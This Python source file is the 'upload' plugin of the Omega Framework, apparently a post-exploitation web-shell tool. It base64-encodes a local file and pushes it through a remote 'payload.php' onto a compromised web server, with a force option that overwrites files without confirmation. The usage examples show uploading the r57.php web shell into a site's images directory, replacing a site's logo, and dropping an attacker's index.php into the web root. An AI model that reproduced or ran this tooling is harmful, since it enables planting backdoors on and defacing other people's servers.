#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Omega Framework
#            ---------------------------------------------------
#                  Copyright (C) <2020>  <Entynetproject>       
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

"""Upload a file.
USAGE:
    upload <local_file> <remote_dir>
OPTIONS:
    -f
        Overwrite destination without confirmation if it
        already exists.
DESCRIPTION:
    Upload a local file to the remote server.
    - local file must be readable.
    - remote directory must be a writable file or directory.
    - If remote directory is not provided, local file is uploaded
    to remote current working directory (which can be known with
    the `pwd` command).
    - Unless '-f' option has been provided, user confirmation is
    needed to overwrite remote directory (if it already exists).
    NOTE: If the user confirms remote directory overwrite,
    another HTTP request will be sent to upload the file.
LIMITATIONS:
    Recursive directory and multiple file uploads are not available.
EXAMPLES:
    > upload /data/payloads/r75.php /var/www/images
      - Upload your local r57.php file to the remote images dir
    > upload -f /tmp/logo-gimped.png /srv/www/img/logo.png
      - Overwrite the remote logo with your own without confirm
    > upload C:\\Users\\blackhat\\index.php
      - Upload your index.php to the remote server's current
        working directory. If your location is a web root path
        which already contains an index.php, then you must
        answer to the confirmation request.
"""

import sys
import os
import base64

import utils
import ui.input

from api import plugin
from api import server

# parse arguments
if not 2 <= len(plugin.argv) <= 4:
    sys.exit(plugin.help)

w = os.environ['OLDPWD']
os.chdir(w)

if plugin.argv[1] == "-f":
    force = True
    arg1 = 2
    arg2 = 3
    arglen = len(plugin.argv) - 1
else:
    force = False
    arg1 = 1
    arg2 = 2
    arglen = len(plugin.argv)

if arglen == 3:
    relpath = plugin.argv[arg2]
else:
    relpath = server.path.getcwd()
abspath = server.path.abspath(relpath)

local_relpath = plugin.argv[arg1]
local_abspath = utils.path.truepath(local_relpath)
local_basename = os.path.basename(local_abspath)

# check for errors
if not os.path.exists(local_abspath):
    g = os.environ['HOME']
    os.chdir(g + "/omega")
    sys.exit("Can't upload %s: No such file or directory" % local_abspath)

if not os.path.isfile(local_abspath):
    g = os.environ['HOME']
    os.chdir(g + "/omega")
    sys.exit("Can't upload %s: Not a file" % local_abspath)

try:
    data = open(local_abspath, 'rb').read()
except OSError as e:
    g = os.environ['HOME']
    os.chdir(g + "/omega")
    sys.exit("Can't upload %s: %s" % (e.filename, e.strerror))

# send the payload (twice if needed)
payload = server.payload.Payload("payload.php")
payload['TARGET'] = abspath
payload['NAME'] = local_basename
payload['DATA'] = base64.b64encode(data)
payload['FORCE'] = force

for iteration in [1, 2]:
    if iteration == 2:
        payload['FORCE'] = True

    status, uploaded_file = payload.send()

    if status == 'KO':
        question = "Remote destination %s already exists, overwrite it ?"
        if ui.input.Expect(False)(question % uploaded_file):
            g = os.environ['HOME']
            os.chdir(g + "/omega")
            sys.exit("File transfer aborted")
        else:
            continue

    print("[+] File successfully uploaded!")
    g = os.environ['HOME']
    os.chdir(g + "/omega")
    sys.exit(0)
